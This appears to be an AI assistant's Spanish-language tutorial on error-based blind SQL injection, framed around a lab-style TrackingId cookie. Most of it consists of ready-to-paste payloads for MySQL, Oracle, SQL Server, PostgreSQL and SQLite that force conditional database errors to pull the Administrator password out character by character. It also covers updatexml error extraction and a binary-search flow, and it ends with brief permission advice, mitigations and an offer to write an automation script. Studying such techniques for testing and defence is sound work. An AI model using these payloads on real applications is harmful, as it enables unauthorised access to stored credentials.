# Blind SQLi — Explotación mediante errores condicionales

---

## 1) Idea clave

En algunas aplicaciones la respuesta HTTP no cambia si una consulta devuelve filas o no (por tanto boolean-based blind no sirve). Sin embargo, **si se genera un error en la base de datos** normalmente la aplicación reaccionará de forma diferente (mensaje distinto, código 500, log, o cambio en el HTML).

La técnica consiste en **forzar un error** (ej. división por cero, conversion failure, llamada a función inexistente) **sólo cuando una condición es verdadera**. Observando si aparece el error (o cualquier diferencia), se infiere el valor booleano de la condición y así se extrae información bit a bit o carácter a carácter.

---

## 2) `CASE WHEN ... THEN 1/0 ELSE 'a' END`

La expresión `CASE WHEN (condición) THEN 1/0 ELSE 'a' END` evalúa la condición:

* Si la condición es **verdadera**, la expresión intenta evaluar `1/0` (división por cero) → **error**.
* Si la condición es **falsa**, evalúa `'a'` → no hay error.

Si la aplicación muestra un comportamiento diferente cuando se lanza el error, ya tienes un canal para inferir si la condición era verdadera.

**Ejemplo genérico** (injectado dentro de comillas):

```
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

* La subconsulta devuelve `1/0` → error (si 1=1), por lo tanto diferencia en la respuesta.

**Nota:** la sintaxis exacta de `CASE` y el soporte de expresiones (1/0) puede variar por SGBD; veremos alternativas por motor.

---

## 3) Desglose sintáctico (paso a paso)

Tomemos el payload completo que inyectas en `TrackingId`:

```
xyz' AND (SELECT CASE WHEN (cond) THEN 1/0 ELSE 'a' END FROM Users)='a
```

* `xyz'` cierra la comilla abierta en la consulta original.
* `AND (...)='a'` combina una comparación que depende del resultado de la subconsulta.
* `SELECT CASE WHEN (cond) THEN 1/0 ELSE 'a' END FROM Users` es una subconsulta que, dependiendo de `cond`, devolverá `1/0` (error) o `'a'` (sin error).

**Por qué comparamos con `='a'` al final?**

* Para encajar la subconsulta dentro de la expresión booleana/comparativa que la aplicación espera. La aplicación puede tener algo como `WHERE TrackingId = '<input>'` — al inyectar `AND (<subquery>)='a'` nos aseguramos de que la sintaxis global sea válida si no ocurre el error.

---

## 4) Variantes y alternativas por SGBD

### 4.1 MySQL

* `CASE` funciona; `DIV` o `1/0` provoca error de división por cero.
* También se pueden usar funciones XML que provoquen error: `updatexml(1,concat(0x7e,(select database())),1)` → error con el contenido.

**Ejemplo MySQL** (cookie):

```
TrackingId=xyz' AND (SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='Administrator'),1,1)='s') THEN 1/0 ELSE 'a' END)='a
```

Alternativa (error-based extraction using `updatexml`):

```
' AND updatexml(1,concat(0x7e,(SELECT database())),1) --
```

### 4.2 PostgreSQL

* `CASE` también disponible; `1/0` produce división por cero. Uso de `pg_sleep()` para delays es otra técnica.
* Usar `RAISE` desde funciones PL/pgSQL no es práctico desde una simple consulta; preferir `CASE`/`1/0` o pruebas booleanas.

### 4.3 SQL Server (T-SQL)

* No es común hacer `1/0` dentro de `SELECT CASE` en T-SQL; sin embargo se puede forzar error con `convert(int, 'string')` o usar `RAISERROR` en un exec.
* Ejemplo de forzado de error: `SELECT CASE WHEN (cond) THEN CONVERT(int,'notint') ELSE 'a' END` → conversión falla.
* Otra opción potente: `IF (cond) RAISERROR('err',16,1);` pero RAISERROR puede necesitar un contexto distinto (no siempre usable directamente en una subquery). También se usan `master..xp_dirtree` para OAST.

### 4.4 Oracle

* Oracle soporta `CASE`/`CASE WHEN` y `1/0` generaría `ORA-01476: divisor equal to zero` si se usa en un contexto numérico. Sin embargo Oracle usa `SUBSTR` en lugar de `SUBSTRING`.
* En Oracle, para seleccionar literales sin tabla se usa `FROM DUAL`.

**Ejemplo Oracle**:

```
' AND (SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='Administrator'),1,1)='s') THEN 1/0 ELSE 'a' END FROM DUAL)='a
```

### 4.5 SQLite

* `CASE` existe y `1/0` genera `division by zero`.

---

## 5) Uso práctico para extraer datos carácter a carácter

Queremos saber si el primer carácter del password es > 'm'. Construimos la condición `SUBSTRING(password,1,1) > 'm'` y la metemos en el `CASE`:

```
xyz' AND (SELECT CASE WHEN (SUBSTRING((SELECT Password FROM Users WHERE Username='Administrator'),1,1) > 'm') THEN 1/0 ELSE 'a' END)='a
```

* Si la condición es verdadera → subconsulta intenta `1/0` → error en la DB → respuesta distinta → inferimos true.
* Si la condición es falsa → subconsulta devuelve `'a'` → no hay error → inferimos false.

Repetir con comparaciones binarias o búsqueda por rango para cada posición.

---

## 6) Alternativas para provocar error (cuando `1/0` no es práctico)

* **Conversión inválida**: `CAST((SELECT somestring) AS INT)` en motores que lancen error si la cadena no es numérica.
* **Funciones XML (MySQL)**: `extractvalue()` o `updatexml()` con una subconsulta concatenada produce errores que muestran datos.
* **FORCE error via function call**: llamar a función que no existe o pasar argumentos inválidos.
* **Arithmetic overflow / divide by zero**: `1/0` o `POWER(large, large)`.
* **Raiserror / THROW (SQL Server)**: invocar error explícito si se puede ejecutar código T-SQL.

---

## 7) Ejemplos concretos completos (payloads listos)

> Ajustá el final de comentario (`-- `) según el contexto y motor. URL-encodea al pegar en GET.

### MySQL — test condicional y provocar error (substring > 'm')

```
Cookie: TrackingId=xyz' AND (SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='Administrator'),1,1) > 'm') THEN 1/0 ELSE 'a' END)='a
```

### Oracle — usando SUBSTR y FROM DUAL

```
Cookie: TrackingId=xyz' AND (SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='Administrator'),1,1) > 'm') THEN 1/0 ELSE 'a' END FROM DUAL)='a
```

### SQL Server — conversión inválida para forzar error

```
Cookie: TrackingId=xyz' AND (SELECT CASE WHEN (SUBSTRING((SELECT TOP 1 password FROM users WHERE username='Administrator'),1,1) > 'm') THEN CONVERT(int,'notint') ELSE 'a' END)='a
```

### PostgreSQL — división por cero

```
Cookie: TrackingId=xyz' AND (SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='Administrator') FROM 1 FOR 1) > 'm') THEN 1/0 ELSE 'a' END)='a
```

---

## 8) Detección: ¿cómo sé si hubo error?

* **Código HTTP** 500 u otro.
* **Contenido de la respuesta**: mensaje de error SQL (si está expuesto) o contenido diferente.
* **Longitud de la respuesta**: variación significativa.
* **Headers**: a veces aparecen cabeceras distintas.

Siempre compara contra respuestas de referencia (condición known-true / known-false) para evitar falsos positivos.

---

## 9) Buenas prácticas al usar esta técnica

* **Prueba primero en un lab o con permiso**.
* URL-encodea y respeta cómo la app envuelve tu input.
* Implementa backoff y límites de velocidad.
* Usa `LIMIT 1`/`TOP 1`/`ROWNUM=1` en subqueries para evitar múltiples filas.
* Si no ves errores, alterna con time-based o OAST.

---

## 10) Ejemplo completo de extracción (flujo)

1. Confirmás que la aplicación revela diferencia al forzar error: prueba `xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a` y `xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a'`.
2. Determinás la posición `pos` del carácter a extraer.
3. Usás búsqueda binaria con `ASCII(SUBSTRING(...)) > mid` anidada en `CASE` para reducir peticiones.
4. Cuando confirmás el ASCII exacto, pasás a la siguiente posición.

---

## 11) Plantilla de payloads para el lienzo (para copiar)

* MySQL (cond-error, comparar ASCII mayor que 109):

```
' AND (SELECT CASE WHEN (ASCII(SUBSTRING((SELECT password FROM users WHERE username='Administrator'),1,1)) > 109) THEN 1/0 ELSE 'a' END)='a
```

* SQLServer (conv. a int para forzar error):

```
' AND (SELECT CASE WHEN (ASCII(SUBSTRING((SELECT TOP 1 password FROM users WHERE username='Administrator'),1,1)) > 109) THEN CONVERT(int,'nota') ELSE 'a' END)='a
```

---

## 12) Mitigaciones

* Prepared statements; no concatenar SQL con input.
* No devolver detalles de errores al cliente.
* Menos privilegios en la cuenta DB.
* Monitorizar patrones inusuales y bloquear peticiones que intentan forzar errores repetidamente.

---

Si querés, puedo:

* Añadir ejemplos concretos con la URL-encoding lista para Burp Repeater.
* Generar un script Python que automatice extracción vía errores condicionales (búsqueda binaria).
* Añadir capturas de ejemplo para un lab (requests/responses). ¿Cuál preferís?
